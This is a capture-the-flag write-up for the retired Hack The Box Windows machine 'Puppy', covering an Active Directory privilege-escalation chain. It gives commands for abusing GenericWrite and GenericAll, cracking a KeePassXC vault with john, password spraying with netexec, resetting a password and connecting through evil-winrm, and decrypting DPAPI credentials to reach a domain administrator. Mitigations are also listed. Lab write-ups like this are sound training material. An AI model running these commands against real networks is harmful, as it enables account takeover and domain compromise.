---
machine: Puppy
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, genericwrite, keepassxc, genericall, dpapi, privesc]
---

# Puppy — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

HR user credentials allow writing to the Developers group and reaching a share with a KeePassXC database. The master password cracks and the vault exports; spraying reaches `ant.edwards`, who has GenericAll over `adam.silver` and can reset his password. A site backup leaks `steph.cooper`'s password, and a saved DPAPI credential gives `steph.cooper_adm`, a domain administrator.

## Recon

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,5985,3268 <IP>
```

- Domain controller `PUPPY.HTB` with DNS, Kerberos, LDAP, SMB and WinRM.
- `netexec` confirms the domain and services.
- The scenario is an AD pentest with initial HR credentials.

## Enumeration

With `levi.james`, enumerate BloodHound: the user is in HR and has `GenericWrite` over the Developers group. Add yourself to the group and access the `dev` share, which contains a `recovery.kdbx` database and the KeePassXC installer.

```bash
net rpc group addmem developers levi.james -U puppy.htb/levi.james%<PASS> -S puppy.htb
smbclient //puppy.htb/dev -U puppy.htb/levi.james%<PASS>
```

## Foothold

`keepass2john`/`john-the-ripper.keepass2john` extracts the Argon2 hash and cracks the master password. `keepassxc-cli export` dumps the credentials and spraying all users finds `ant.edwards`.

```bash
john-the-ripper.keepass2john recovery.kdbx > keepass.hash
john --wordlist=rockyou.txt keepass.hash
keepassxc-cli export --format csv recovery.kdbx
netexec smb puppy.htb -u users.txt -p passwords.txt --continue-on-success
```

## Lateral movement

`ant.edwards` is in Senior Devs and has `GenericAll` over `adam.silver`. Reset his password and log in over WinRM.

```bash
net rpc password adam.silver '<NEWPASS>' -U puppy.htb/ant.edwards%<PASS> -S puppy.htb
evil-winrm -i puppy.htb -u adam.silver -p '<NEWPASS>'
```

## Privilege escalation

`adam.silver` can read `C:\Backups\site-backup-2024-12-30.zip`. The backup contains `nms-auth-config.xml.bak` with `steph.cooper`'s password; that account stores a DPAPI credential for `steph.cooper_adm`, an administrator.

```powershell
dpapi.py masterkey -file <MASTERKEY> -sid <SID> -password <PASS>
dpapi.py credential -file <CRED> -key <KEY>
```

## Evidence

- `GenericWrite` over Developers.
- `dev` share and KeePassXC.
- Cracking and spray to `ant.edwards`.
- `GenericAll` over `adam.silver`.
- Backup, DPAPI and `steph.cooper_adm`.

## Lessons learned

- `GenericWrite` over a group allows self-addition and broader access.
- Weak KeePassXC master passwords crack.
- An exported vault feeds password spraying.
- `GenericAll` allows resetting another user's password.
- Application backups leak service credentials.

## Mitigation and detection

- Audit `GenericWrite`/`GenericAll` and privileged groups.
- Use strong master passwords and MFA.
- Restrict backup and secret access.
- Protect DPAPI and rotate service credentials.

## References

- [0xdf — Puppy](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [IppSec — Puppy](https://www.youtube.com/watch?v=QZQ-IjsI5Qk)
- [Hack The Box — Puppy](https://app.hackthebox.com/machines/puppy)
